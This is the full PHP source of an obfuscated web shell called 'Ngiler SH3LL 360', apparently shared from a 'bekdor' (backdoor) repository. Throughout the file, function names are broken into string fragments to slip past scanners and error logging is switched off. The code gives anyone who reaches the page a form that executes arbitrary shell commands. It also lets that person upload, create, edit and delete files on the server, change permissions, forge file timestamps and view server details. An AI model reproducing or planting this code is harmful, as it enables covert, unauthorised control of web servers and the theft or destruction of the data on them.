<?php 
error_reporting(0); 
$inst = "in" . "i_s" . "et"; 
@$inst("erro" . "r_l" . "og", null); 
@$inst("ma" . "x_ex" . "ecut" . "ion_t" . "ime", 0);echo "\xa<!doctypehtml>\xa<html lang="en">\xa<head>
<meta charset="UTF-8">
<meta content="width=device-width,initial-scale=1"name="viewport">\xa<title>#$@%#$%!</title>\xa<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"rel="stylesheet"crossorigin="anonymous"integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="referrerpolicy="no-referrer">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">\xa<link rel="stylesheet" href="https://getbootstrap.com/docs/4.0/dist/css/bootstrap.min.css">
<link rel="preconnect" href="https://fonts.googleapis.com">\xa<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>\xa<link href="https://fonts.googleapis.com/css2?family=Trade+Winds&display=swap" rel="stylesheet">\xa<style>\xa    @import url("https://fonts.googleapis.com/css2?family=Trade+Winds");
body {\xa    background-color: #212529;
    color: #fff;
    font-size: 16px;\xa}
table {
    width: 100%;\xa    border-collapse: collapse;\xa}\xatable, td, th {\xa    border: 2px solid #212529;
    font-size: 14px;\xa}
th {\xa    background-color: #000;\xa}\xa.fa {
    margin-right: 5px;\xa}\xa.fa-folder {\xa    color: #F29321;
}\xaa {
text-decoration: none;\xacolor: #fff;
        }\xa.silkscreen-regular {\xa  font-family: "Silkscreen", sans-serif;\xa  font-weight: 400;
  font-style: normal;
  font-size: 40px;
}\xa\xa.silkscreen-bold {
  font-family: "Silkscreen", sans-serif;
  font-weight: 700;
  font-style: normal;\xa}\xa
.button-container {\xa  display: flex;
  justify-content: center;
  flex-wrap: wrap;\xa  margin-bottom: 10px;
}
.modal {
  display: none;\xa  position: fixed;
  left: 0;
  top: 0;
  width: 100%;\xa  height: 100%;\xa  overflow: auto;\xa  background-color: rgb(0 0 0 / 57%);\xa}\xa
.modal-content {\xa  background-color: #fefefe;
  margin: 5% auto;\xa  padding: 20px;\xa  border: 1px solid #04FBFF;
  max-width: 70%;\xa  box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);\xa  background-color: #212529;\xa  border-radius: 10px solid #04FBFF;\xa}
\xa.close {\xa  color: #aaa;
  float: right;
  font-size: 28px;
  font-weight: bold;
}

.close:hover,
.close:focus {
  color: black;
  text-decoration: none;
  cursor: pointer;\xa}\xa.directory-listing-table {
  margin: auto;\xa  background-color: #212529;\xa  padding: .7rem 1rem;\xa  max-width: 900px;
  width: 100%;\xa}
textarea {
    max-width: 100%;\xa    max-height: 100%;
    padding-left: 2px;\xa    resize: none;\xa    overflow: auto;\xa    color: #fff;\xa    text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
    border: 1px solid rgba(0,0,0,0.5);
    border-radius: 4px;
    box-shadow: inset 0 -1px 7px #34A9B8, 0 1px 1px rgba(255,255,255,0.2);
    -webkit-transition: box-shadow .5s ease;
    -moz-transition: box-shadow .5s ease;\xa    -o-transition: box-shadow .5s ease;
    -ms-transition: box-shadow .5s ease;\xa    transition: box-shadow .5s ease;
    background: rgba(0,0,0,0.3);\xa}
    </style>\xa</head><body>"; 
$web = (isset($_SERVER["H" . "T" . "TP" . "S"]) && $_SERVER["H" . "T" . "TP" . "S"] === "o" . "n" ? "ht" . "tp" . "s" : "ht" . "tp") . "://" . $_SERVER["HT" . "TP" . "_H" . "OS" . "T"]; 
$gser = "ge" . "t_cur" . "rent_u" . "ser";  
$enp = "enc" . "odeP" . "ath";  
$isd = "i" . "s_d" . "ir";  
$stce = "st" . "r_re" . "pl" . "ace";  
$isr = "i" . "s_rea" . "da" . "ble";  
$dept = "de" . "co" . "deP" . "ath";  
$pname = "ph" . "p_u" . "name";  
$pver = "ph" . "pver" . "sion";  
$isw = "is" . "_w" . "rit" . "able";  
$cm = "ch" . "m" . "od";  
$uren = "ur" . "lenc" . "ode"; 
$scd = "sc"."and"."ir"; 
$flm = "fil" . "emt" . "ime"; //pilewaktu 
$fz = "fil" . "esi" . "ze"; //pileukuran 
function formatSizeUnits($bytes){ 
    $nf = "num" . "ber_" . "for" . "mat"; 
    if($bytes>=1073741824){$bytes='<font color="aqua">'.$nf($bytes/1073741824,2).'</font> GB';}elseif($bytes>=1048576){$bytes='<font color="aqua">'.$nf($bytes/1048576,2).'</font> MB';}elseif($bytes>=1024){ $bytes='<font color="orange">'.$nf($bytes/1024,3).'</font> KB';}elseif($bytes>1){ 
        $bytes='<font color="orange">'.$bytes.'</font> B';}elseif($bytes==1){ 
        $bytes='<font color="orange">'.$bytes.'</font> B';}else{ 
        $bytes='<font color="red">0</font> B';}return $bytes; 
}function fileExtension($file) { 
    $sub = "su" . "bs" . "tr"; 
    $sthr = "st" . "rr" . "chr"; 
    return $sub($sthr($file,'.'),1); 
}function fileIcon($file) {$stl = "st" . "rto" . "lower";$fe = "fil" . "eEx" . "ten" . "sion";$imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp", "ico");$audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");$ext=$stl($fe($file));if($file=="erro" . "r_log") {return '<i class="fa-sharp fa-solid fa-bug"></i> ';}elseif($file==".hta"."ccess") {return '<i class="fa-solid fa-hammer"></i> ';}if($ext=="html"||$ext=="htm") {return '<i class="fa-brands fa-html5"></i> ';}elseif($ext=="p"."hp"||$ext=="phtml") {return '<i class="fa-brands fa-php"></i> ';}elseif(in_array($ext,$imgs)) {return '<i class="fa-regular fa-images"></i> ';}elseif($ext=="zip"){return '<i class="fa-solid fa-fi'.'le-archive"></i> ';}elseif($ext=="css"){return '<i class="fa-brands fa-css3"></i> ';}elseif($ext=="txt"){return '<i class="fa fa-file-text"></i> ';}elseif(in_array($ext,$audio)) {return '<i class="fa-solid fa-music"></i> ';}elseif($ext=="py"){return '<i class="fa-brands fa-py'.'thon"></i> ';}elseif($ext=="js"){return '<i class="fa-brands fa-js"></i> ';}elseif($ext=="mp4"){return '<i class="fa fa-file-video"></i> ';}else{return '<i class="fa-solid fa-file"></i> ';} 
}   function encodePath($path) {$stce = "st" . "r_rep" . "lace";$a = array("/", "\", ".", ":");$b = array(net("\340\246\225"),net("\xe0\246\x96"),net("\340\xa6\227"),net("\340\xa6\230"));return $stce($a,$b,$path); 
}   function decodePath($path) {$stce = "st" . "r_rep" . "lace";$a = array("/", "\", ".", ":");$b = array(net("\340\246\x95"),net("\340\246\x96"),net("\340\xa6\227"),net("\340\xa6\230")); 
        return $stce($b,$a,$path); 
}  function net($hexnet) {$slen = "st" . "rl" . "en";$dhx = "dech" . "ex";$or = "or" . "d"; for ($i = 0; $i < $slen($hexnet); $i++) {$d7net .= $dhx($or($hexnet[$i]));}return $d7net; 
} function ipserv() {$ghb = "ge" . "tho" . "stbyn" . "ame";if (empty($_SERVER["SER" . "VER_AD" . "DR"])) {return $ghb($_SERVER["SERV" . "ER_N" . "AME"]);if (empty($ghb($_SERVER["SERV" . "ER_N" . "AME"]))) {return $_SERVER["SERV" . "ER_N" . "AME"];}} else {return $_SERVER["SERV" . "ER_AD" . "DR"];}} 
echo "<div style='margin-bottom: 0px; margin-left: 0px;'>"; 
        echo "</div>"; 
echo '<br>'; 
$rutpat=__DIR__; 
if(isset($_GET['p'])){ 
    if(empty($_GET['p'])){ 
        $p=$rutpat; 
    }elseif(!$isd($dept($_GET['p']))){ 
         echo "<script>
alert('Direc" . "tory is Corrupted and Unrea" . "dable.');
window.locat" . "ion.replace('?');
</script>"; 
    }elseif($isd($dept($_GET['p']))){ 
        $p=$dept($_GET['p']); 
    } 
}elseif(isset($_GET['q'])){ 
    if(!$isd($dept($_GET['q']))){ 
        echo "<script>window.location.replace('?p=');</script>"; 
    }elseif($isd($dept($_GET['q']))){ 
        $p=$dept($_GET['q']); 
    } 
}else{ 
    $p=$rutpat; 
} 
define("PATH",$p); 
    if(isset($_GET['p'])){ 
        if($isr(PATH)){ 
            $fetch_obj=$scd(PATH); 
            $folders=array(); 
            $files=array(); 
            foreach($fetch_obj as $obj){ 
                if($obj=='.'||$obj=='..'){ 
                    continue; 
                } 
                    $new_obj=PATH.'/'.$obj; 
                    if($isd($new_obj)){ 
                        array_push($folders,$obj); 
                    }elseif(is_file($new_obj)){ 
                        array_push($files,$obj); 
                    } 
                } 
            } 
// mnu 
echo "<table class='table table-dark' style='width:70%;box-shadow: 0 0 5px #0D97A5' align='center'><thead style='--bs-table-bg:#0D97A5;--bs-table-color:#000;'><tr><th><div style='font-family:Trade Winds;font-size:24px;color:#000;' align='center'><i class='fa-brands fa-napster'></i> <a href='" . $_SERVER["SCR" . "IPT_N" . "AME"] . "'>Ngiler SH3LL 360</a></div></th></tr></thead><td>"; 
echo "<center><button onclick=location.href='" . $_SERVER["SC" . "RIP" . "T_NA" . "ME"] . "' class='btn btn-outline-light'><i class='fas fa-home'></i> Home</button>&nbsp;"; 
echo "<button id="Information" class="btn btn-outline-light"><i class="fa fa-info-circle"></i>Information</button>&nbsp;"; 
echo "<button onclick=location.href='?p=" . $uren($enp(PATH)) . "&opet=" . net("cre" . "atefi" . "le") . "' class='btn btn-outline-light'><i class='fa-solid fa-file-circle-plus'></i> Create File</button>&nbsp;"; 
echo "<button onclick=location.href='?p=" . $uren($enp(PATH)) . "&opet=" . net("buatd" . "ir") . "' class='btn btn-outline-light'><i class='fa-solid fa-folder-plus'></i> Create Folder</button>"; 
echo "</center><hr color='white'>Dir : "; 
$exp = "exp" . "lo" . "de"; 
$path=$stce('\\','/',PATH); 
$paths=$exp('/',$path); 
foreach($paths as $id=>$dir_part){ 
    if($dir_part==''&&$id==0){ 
        $a=true; 
        echo "<a href="?p=/"></i> : /</a>";continue; 
    }if($dir_part=='')continue; 
    echo "<a href='?p=";for($i=0;$i<=$id;$i++){ 
        echo $stce(":",net("\340\246\x98"),$paths[$i]);  
        if($i!=$id) echo net("\340\246\225"); 
    } 
        echo "' style='font-size:14px; color: white; text-decoration: none;'>" . $dir_part . "</a>&nbsp;/ "; 
    } echo "</td></table>"; 
    echo "<table class="table table-dark" style="width:70%;box-shadow: 0 0 5px #0D97A5" align="center"><td>\xa<form class="row g-3" method="post">\xa  <div class="col-auto">\xa  <div class="input-group" style="width:630px;">
    <input type="text" value="" . $_POST["koman"] . "" placeholder="uname -a" name="koman" class="form-control">
    <input type="submit" class="btn btn-outline-light" value="execute" name="submit">\xa  </div></div>\xa  <div class="col-auto"></form>\xa  <form method="POST" enctype="multipart/form-data">\xa  <div class="input-group" style="width:370px;">
    <input type="file" name="fileToUpload" class="form-control" id="fileToUpload">\xa    <input type="submit" class="btn btn-outline-light" value="upload" name="uplod">\xa  </div></div>
</form></td></table>"; 
if(isset($_POST["up"."lod"])){ 
    $filez = PATH . "/" . $_FILES["fil" . "eToUp" . "load"]["name"]; 
    $bsn = "bas" . "ename"; 
    $mvup = "mov" . "e_uplo" . "aded_f" . "ile"; 
        if($mvup($_FILES["fi" . "leToU" . "plo" . "ad"]["tm" . "p_na" . "me"],$filez)){ 
            echo "<table class='table table-dark' style='width:30%;box-shadow: 0 0 5px #0D97A5;' align='center'>
                <thead style='--bs-table-bg:#0D97A5;--bs-table-color:#000;'>
                <tr><th><font color='lime'>Successfully.</font></th></tr></thead>\xa                <td>" . $bsn($filez) . " has been uploaded.</td></table>"; 
        }else{ 
                echo "<table class='table table-dark' style='width:30%;box-shadow: 0 0 5px #0D97A5;' align='center'>
                <thead style='--bs-table-bg:#0D97A5;--bs-table-color:#000;'>
                <tr><th><font color='#F82706'>FAILLED.</font></th></tr></thead>
                <td>Sorry, there was an error uploading your file.</td></table>"; 
            }exit(); 
        } 
if(isset($_POST['submit'])) { 
        ekse($_POST['koman'], PATH); 
    } 
    echo "</center>
<div id="myModal" class="modal">\xa  <div class="modal-content">\xa  <table class="table table-dark" style="width:100%;"><thead style="--bs-table-bg:#0D97A5;--bs-table-color:#000;"><tr><th>
    Information Server</th></tr></thead><td>\xa    <p><i class="fa-solid fa-network-wired" aria-hidden="true"></i> ip : <font color="#0D97A5">" . ipserv() . "</font></p>
    <p><i class="fa-solid fa-computer" aria-hidden="true"></i> Sys" . "tem : <font color="#0D97A5">" . $pname() . "</font></p>\xa    <p><i class="fa-solid fa-user" aria-hidden="true"></i> User : <font color="#0D97A5">" . @$gser() . "</font></p>
    <p><i class="fa-brands fa-php" aria-hidden="true"></i> PHP Ver" . "sion : <font color="#0D97A5">" . @$pver() . "</font></p>\xa    <p><i class="fa-solid fa-server" aria-hidden="true"></i> Sof" . "tware : <font color="#0D97A5">" . $_SERVER["SERV" . "ER_SOF" . "TWARE"] . "</font></p>\xa    </td></table>
    <span class="close btn btn-outline-light" style="width:200px;font-size:14px;float:right;">close</span>
  </div>
</div>"; 
if ($_REQUEST['opet'] == net("cre" . "atef" . "ile")){ 
    function cretf(){ 
        $fpn = "fo"."pen"; 
        $fwr = "fwr"."ite"; 
        $pat = PATH; 
        $nama_file = $_POST["nama"."_file"]; 
        $isi_file = $_POST["isi_"."file"]; 
        $handle = $fpn("$pat/$nama_file", 'w'); 
        $filez = $pat."/".$nama_file; 
        $stce = "st" . "r_re" . "pl" . "ace"; 
        $asu = $stce($_SERVER["DO" . "CUM" . "ENT_R" . "OOT"], $web. "", $filez); 
        if ($fwr($handle, $isi_file)) { 
            echo "<table class="table table-dark table-sm" style="width:30%;box-shadow: 0 0 5px #0D97A5;" align="center">
            <thead style="--bs-table-bg:#0D97A5;--bs-table-color:#000;">
            <tr><th><font color="lime">Successfully!!</font></th></tr></thead>\xa            <td>Created =>&nbsp;<font color="lime">" . $nama_file . "<br></font>Link : <a href="" . $asu . "" target="_blank"><font color="aqua"><i>Click here</i></a></font></td></table>"; 
        } else { 
            echo "<table class="table table-dark table-sm" style="width:30%;box-shadow: 0 0 5px #0D97A5;" align="center">\xa            <thead style="--bs-table-bg:#0D97A5;--bs-table-color:#000;">
            <tr><th>ERROR</th></tr></thead>\xa            <td><font color=red><center>
            <i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Failed to create file.</font></script></td></table>"; 
        } 
    } if(!isset($_POST['bikin'])) { 
        echo "<table class='table table-dark' style='width:50%;box-shadow: 0 0 5px #0D97A5;' align='center'>
        <thead style='--bs-table-bg:#0D97A5;--bs-table-color:#000;'>
        <tr><th>Cre" . "ate Fi" . "le</th></tr></thead>\xa        <td><form method='POST'>\xa        <input type='text' value='file.php' placeholder='Nama File' style='width: 525px;' name='nama_file' class='form-control mb-3' autocomplete='off'>\xa        <textarea name='isi_file' rows='20' cols='130' placeholder='Hello World!'></textarea><br>
        <button type='sumbit' class='btn btn-outline-light' style='width:200px; height:36px;' height:30;' name='bikin'>CREATE</button>&nbsp;
        <a href='?p=" . $enp(PATH) . "' class='btn btn-outline-light'>Back</a><br>
    </form></td></table>"; 
        } else { 
            cretf(); 
        }exit(); 
} elseif ($_GET['opet'] == net('bua'.'td'.'ir')) { 
    echo "<table class="table table-dark" style="width:50%;box-shadow: 0 0 5px #0D97A5;" align="center">\xa            <thead style="--bs-table-bg:#0D97A5;--bs-table-color:#000;">\xa            <tr><th>Cre" . "ate Fol" . "der</th></td></thead>
            <td>\xa            <form action="" method = "POST"><center>
            <div style="width:300px;">\xa            <input type="text" class="form-control" placeholder="Folder Name" name="add" id="add"/><br></div>
            <button type="submit" class="btn btn-outline-light" name="buat" value="Create directory" style="width:120px;">Create</button>&nbsp;
        <a href="?p=" . $enp(PATH) . "" class="btn btn-outline-light" style="width:120px;">Back</a><br><br></form></td></table>"; 
    if (isset($_POST['buat'])) { 
        $foladd = PATH.'/'.$_POST['add']; 
        $cref = "mkd" . "ir"; 
        $flex = "fil" . "e_exi" . "sts"; 
        if (!$flex($foladd)) { 
            if ($cref($foladd, 0755, true)) { 
         echo "<table class='table table-dark' align='center' style='width:40%;box-shadow: 0 0 5px #0D97A5;'>\xa        <thead style='--bs-table-bg:#0D97A5;--bs-table-color:#000;'><tr><th><font color='lime'>Successfully!!</font></th></tr></thead>
        <td>Folder <font color='orange'>" . $_POST["add"] . "</font> berhasil dibuat.<br>Url => 
        <a href='?p=" . $uren($enp(PATH)) . net("\xe0\246\225") . $_POST["add"] . "'><i>Here</i></a></td></table>"; 
    } else { 
        echo "<table class='table table-dark' align='center' style='width:40%;box-shadow: 0 0 5px #0D97A5;'>\xa        <thead style='--bs-table-bg:#0D97A5;--bs-table-color:#000;'><tr><th>\xa        <font color='red'>FAILED.</th></tr></thead>
        <td><font color='red'>Gagal membuat folder</font> <font color='orange'>" . $_POST["add"] . "</font>.</td></table>"; 
    } 
} else { 
    echo "<table class='table table-dark' align='center' style='width:40%;box-shadow: 0 0 5px #0D97A5;'>
    <thead style='--bs-table-bg:#0D97A5;--bs-table-color:#000;'><tr><th>EMPTY</th></tr></thead>
    <td>Folder <font color='orange'>" . $_POST["add"] . "</font> sudah ada.</td></table>"; 
    } 
}exit(); 
} 
//fm 
echo "<table class="table table-dark table-hover" style="box-shadow: 0 0 5px #0D97A5;width:90%;border-left:1px solid #40BECC;border-right:1px solid #40BECC;border-bottom:1px solid #40BECC;--bs-border-radius:80rem;" align="center">
            <thead style="--bs-table-bg:#0D97A5;--bs-table-color:#000;">\xa                <tr>\xa                    <th><center>Name</center></th>\xa                    <th><center>Size</center></th>\xa                    <th><center>Last Modified</center></th>
                    <th><center>Permissions</center></th>
                    <th><center>Actions</center></th>
                </tr>\xa            </thead>\xa            <tbody>"; 
            foreach($folders as $folder){ 
         echo " <tr><td><i class='fa-solid fa-folder'></i> <a href='?p=" . $uren($enp(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
        <td><center><b>---</b></td></center>
        <td><center>" . date("F d Y H:i:s", $flm(PATH . "/" . $folder)) . "</center></td>\xa        <td><center>";  
        if($isw(PATH."/".$folder)) echo "<font color="lime">"; 
        elseif(!$isr(PATH."/".$folder)) echo "<font color="red">"; 
        echo d7netstat(PATH."/".$folder); 
        if($isw(PATH."/".$folder) || !$isr(PATH."/".$folder)) echo '</font>'; 
         echo "</td></center>
        <td><center>\xa            <select class='custom-select custom-select-sm' onchange='location = this.value;'>\xa                <option selected>Select</option>
                <option value='?q=" . $uren($enp(PATH)) . "&r=" . $folder . "'>Rename</option>\xa                <option value='?q=" . $uren($enp(PATH)) . "&chdet=" . $folder . "'>Chdate</option>\xa                <option value='?q=" . $uren($enp(PATH)) . "&cmod=" . $folder . "'>Chmod</option>\xa                <option value='?q=" . $uren($enp(PATH)) . "&d=" . $folder . "'>Delete</option>\xa            </select>\xa        </td></center>
    </tr> </div>"; 
    }foreach($files as $file){ 
        echo "<tr>\xa        <td>" . fileIcon($file) . " <a href='?q=" . $uren($enp(PATH)) . "&e=" . $file . "'>" . $file . "</a></td>
      <td><center>" . formatSizeUnits($fz(PATH . "/" . $file)) . "</td></center>\xa        <td><center>" . date("F d Y H:i:s", $flm(PATH . "/" . $file)) . "</td></center>\xa        <td><center>"; 
        if($isw(PATH."/".$file)) echo "<font color="lime">"; 
        elseif(!$isr(PATH."/".$file)) echo "<font color="red">"; 
        echo d7netstat(PATH."/".$file); 
        if($isw(PATH."/".$file) || !$isr(PATH."/".$file)) echo '</font>'; 
        echo "</td></center>\xa        <td><center>
            <select class='custom-select custom-select-sm' onchange='location = this.value;'>
                <option selected>Select</option>
                <option value='?q=" . $uren($enp(PATH)) . "&e=" . $file . "'>Edit File</option>
                <option value='?q=" . $uren($enp(PATH)) . "&r=" . $file . "'>Rename</option>\xa                <option value='?q=" . $uren($enp(PATH)) . "&chdet=" . $file . "'>Chdate</option>
                <option value='?q=" . $uren($enp(PATH)) . "&cmod=" . $file . "'>Chmod</option>
                <option value='?q=" . $uren($enp(PATH)) . "&d=" . $file . "'>Delete</option>\xa            </select>
        </td></center>\xa    </tr>";}echo "</table>
    <table class='table table-dark' style='width:90%;box-shadow: 0 0 5px #0D97A5' align='center'><thead style='--bs-table-bg:#0D97A5;--bs-table-color:#000;'><tr><th>".date("Y")." &copy; Ngiler SH3LL | Recode By Akira.\xa    <div style='float:right;x'>
    <a href='https://github.com/kxeom/bekdor' class='btn btn-outline-light btn-sm'><i class='fa-brands fa-github'></i></a>\xa    <a href='https://github.com/kxeom/' class='btn btn-outline-light btn-sm'><i class='fa-solid fa-globe'></i></a>\xa    <a href='mailto:akira.env@gmail.com' class='btn btn-outline-light btn-sm'><i class='fa-solid fa-envelope'></i></a></div></th></tr></thead><table>"; }else{ if(empty($_GET)){ 
             echo "<script>window.location.replace('?p=');</script>";}}if(isset($_GET['u'.'pl'.'o'.'a'.'d'])){ 
echo "
   <center> <form method="post" enctype="multipart/form-data">
        
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" class="btn btn-dark" value="Upload" name="upload">\xa    </form></center>"; 
    } if(isset($_GET['chdet'])) {  
    if(!empty($_GET['chdet']) && isset($_GET['q'])) { 
        $bsn = "bas" . "en" . "ame"; 
        $filez = $bsn($_GET['chdet']); 
        $fdate = PATH."/".$filez; 
        $tgl = date("F d Y H:i:s",$flm($fdate)); 
        echo "<br><table class="table table-dark" style="width:40%;" align="center">
        <thead style="--bs-table-bg:#0D97A5;--bs-table-color:#000;">\xa        <tr><th>Change Date : " . $tgl . " | Name : " . $filez . "</th></tr></thead>
        <td><center><form method="post">
        <div class="input-group mb-3" style="width:320px;">\xa        <span class="input-group-text">Change :</span>
        <input type="text" name="date" class="form-control" placeholder="" . $tgl . ""></div>
        <input type="submit" name="change" class="btn btn-outline-light">&nbsp;\xa        <a href="?p=" . $enp(PATH) . "" class="btn btn-outline-light" style="width:70px;">Back</a></form></td></table>"; 
        if (isset($_POST['change'])) { 
            $stm = "st" . "rtot" . "ime"; 
            $toc = "to" . "uch"; 
            $tanggal = $stm($_POST['da'.'te']); 
            if (@$toc($fdate, $tanggal) == true) { 
                echo "<script>alert('Changed Successfully.'); window.location.replace('?p=" . $enp(PATH) . "');</script>"; 
            } else { 
                echo "<script>alert('Failed to Changed.'); window.location.replace('?p=" . $enp(PATH) . "');</script>"; 
            } 
        } 
    } 
    } if(isset($_GET['cmod'])) {  
    if(!empty($_GET['cmod']) && isset($_GET['q'])) { 
        $bsn = "bas" . "en" . "ame"; 
        $files = $bsn($_GET['cmod']); 
      echo "<br><table class='table table-dark' style='width:40%;' align='center'><thead style='--bs-table-bg:#0D97A5;--bs-table-color:#000;'><tr><th>
      Change Permission : " . d7netstat(PATH . "/" . $files) . ", Name : " . $files . "</th></tr></thead>\xa      <td><center>\xa      <form method='POST'>
      <div class='input-group mb-3' style='width:320px;'>
            <span class='input-group-text'>Change :</span>
        <input type='text' name='chm0d' maxlength='4' onkeypress='return number(event)' class='form-control' placeholder='" . d7netstat(PATH . "/" . $files) . "' required>\xa        </div>
      <input type='submit' name='change' class='btn btn-outline-light'>&nbsp;\xa      <a href='?p=" . $enp(PATH) . "' class='btn btn-outline-light' style='width:70px;'>Back</a></form>\xa      </td></table>"; 
    if (isset($_POST['change'])) { 
      $cek = PATH."/".$files; 
      $odc = "oc" . "td" . "ec"; 
      $opet = @$cm($cek, $odc($_POST['c'.'hm'.'0d'])); 
    if ($opet == true) { 
        echo "<script>alert('Changed Successfully. " . d7netstat(PATH . "/" . $files) . " => " . $_POST["chm0d"] . "'); window.location.replace('?p=" . $enp(PATH) . "');</script>"; 
        } else { 
             echo "<script>alert('Gagal Mengubah Permission :( .'); window.location.replace('?p=" . $enp(PATH) . "');</script>"; 
        } 
      } 
    } 
} if(isset($_GET['r'])) {  
    if(!empty($_GET['r']) && isset($_GET['q'])) { 
        echo "<br><table class="table table-dark" style="width:40%; box-shadow: 0 0 5px #0D97A5;" align="center">
        <thead style="--bs-table-bg:#0D97A5;--bs-table-color:#000;">\xa        <tr><th>Rename : <font color="white">" . $_GET["r"] . "</font></th></tr></thead>
            <td><form method="post"><center>
            <div class="input-group mb-3" style="width:320px;">
            <span class="input-group-text">Name :</span>\xa        <input type="text" name="name" class="form-control" placeholder="Nama baru">
        </div>\xa        <input type="submit" class="btn btn-outline-light" value="Rename" name="rename">&nbsp;\xa        <a href="?p=" . $enp(PATH) . "" class="btn btn-outline-light" style="width:90px;">Back</a></center>\xa    </form></td></table>"; 
    if(isset($_POST["ren" . "ame"])){ 
        $name=PATH."/".$_GET['r']; 
        $rnme = "ren" . "ame"; 
        if($rnme($name,PATH."/".$_POST['name'])){ 
            echo "<script>alert('Berkas berhasil ganti nama.'); window.location.replace('?p=" . $enp(PATH) . "');</script>"; 
        }else{ 
                echo "<script>alert('Some error occurred.'); window.location.replace('?p=" . $enp(PATH) . "');</script>"; 
            } 
        } 
    } 
}if(isset($_GET['e'])){ 
    if(!empty($_GET['e']) && isset($_GET['q'])){ 
        $htsp = "htm" . "lspec" . "ialch" . "ars"; 
        $fgc = "fi" . "le_g" . "et_con" . "tents"; 
       echo "
    <table class="table table-dark" style="width:80%; box-shadow: 0 0 5px #0D97A5;" align="center">
    <thead style="--bs-table-bg:#0D97A5;--bs-table-color:#000;">\xa        <tr>\xa            <th>
        Edit File : <font color="lime">" . $_GET["e"] . "</font> | Size : " . formatSizeUnits($fz(PATH . "/" . $_GET["e"])) . "<button type="button" class="btn btn-outline-light btn-sm" onclick="myFunction()" style="float:right;"><i class="fa fa-copy"></i> Copy</button></th></tr></thead>\xa        <td><center><form method="post">\xa        <textarea style="height: 500px;\xa        width: 90%;" name="data" id="myInput">" . $htsp($fgc(PATH . "/" . $_GET["e"])) . "</textarea>
        <br><br>\xa        <input type="submit" class="btn btn-outline-light" style="width:200px;" value="Save" name="edit">&nbsp;\xa        <a href="?p=" . $enp(PATH) . "" class="btn btn-outline-light" style="width:200px;">Back</a>\xa                </form>\xa            </center>
        </td>\xa    </table></center>"; 
    if (isset($_POST["edit"])) {  
    $fpn = "fo"."pen"; 
    $fwr = "fwr"."ite"; 
    $pilen = PATH . "/" . $_GET["e"];  
    $data = $_POST["data"];  
    $open = $fpn($pilen, "w");  
    if ($fwr($open, $data)) {  
        echo "<script>alert('Berkas berhasil di simpan.'); window.location.replace('?p=" . $enp(PATH) . "');</script>";  
    } else {  
        echo "<script>alert('Some error occurred.'); window.location.replace('?p=" . $enp(PATH) . "');</script>";  
    } fclose($open);  
 } 
} 
} if(isset($_GET['d']) && isset($_GET['q'])) { 
    $name=PATH."/".$_GET['d']; 
    $uli = "unl" . "ink"; 
    $isf = "is_f" . "ile"; 
    if($isf($name)){ 
        if($uli($name)){ 
             echo "<script>alert('File removed.'); window.location.replace('?p=" . $enp(PATH) . "');</script>"; 
        }else{ 
            echo "<script>alert('Some error occurred.'); window.location.replace('?p=" . $enp(PATH) . "');</script>"; 
        } 
    }elseif($isd($name)){ 
        $rd = "rm" . "d" . "ir"; 
        if($rd($name)==true){ 
            echo "<script>alert('Directory removed.'); window.location.replace('?p=" . $enp(PATH) . "');</script>"; 
    }else{ 
        echo "<script>alert('Some error occurred.'); window.location.replace('?p=" . $enp(PATH) . "');</script>"; 
        } 
    } 
} 
function ekse($coman) { 
$hch = "ht" . "mlspe" . "cialc" . "hars";$sgc = "stre" . "am_g" . "et_con" . "tents"; $ler = "2>" . "&1"; $pm = "pre" . "g_ma" . "tch"; if (!$pm("/" . $ler . "/i", $coman)) { $coman = $coman . " " . $ler; } $komen = $coman; $pr = "pro" . "c_o" . "pen"; $fe = "fun" . "cti" . "on_ex" . "ists";if ($fe($pr)) { $tod = @$pr($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, PATH); echo "<table class='table table-dark' style='width:70%;box-shadow: 0 0 5px #0D97A5' align='center'>
    <thead style='--bs-table-bg:#0D97A5;--bs-table-color:#000;'><tr><th>
    Command : <font color='#fff'>" . $_POST["koman"] . "</font></th></tr></thead><td>\xa    <pre><textarea style='height:400px;width: 100%;color: lime;' readonly>\xa    " . $hch($sgc($crottz[1])) . "</textarea></pre></td></table><br>"; } else { echo "<center><font color='orange'>pro" . "c_ope" . "n function is dis" . "abled!!</font></center>";  
    } die;  
} 
function d7netstat($file){ 
$sb = "sub" . "str";$sp = "spr" . "in" . "tf";$fp = "fil" . "epe" . "rms"; 
$izin = $sb($sp('%o', $fp($file)), -4); 
return $izin; 
} 
?> 
<script> 
function number(event) { 
    var angka = (event.which) ? event.which : event.keyCode 
    if (angka != 46 && angka > 31 && (angka < 48 || angka > 57)) 
        return false; 
    return true; 
} 
function myFunction() { 
  var copyText = document.getElementById("myInput"); 
  copyText.select(); 
  copyText.setSelectionRange(0, 99999); // For mobile devices 
  navigator.clipboard.writeText(copyText.value); 
  alert("Copied Successfully!!"); 
} 
var modal = document.getElementById("myModal"); 
var btn = document.getElementById("Information"); 
var span = document.getElementsByClassName("close")[0]; 
 
btn.onclick = function() { 
  modal.style.display = "block"; 
} 
 
span.onclick = function() { 
  modal.style.display = "none"; 
} 
 
window.onclick = function(event) { 
  if (event.target == modal) { 
    modal.style.display = "none"; 
  } 
} 
</script> 
</body></html>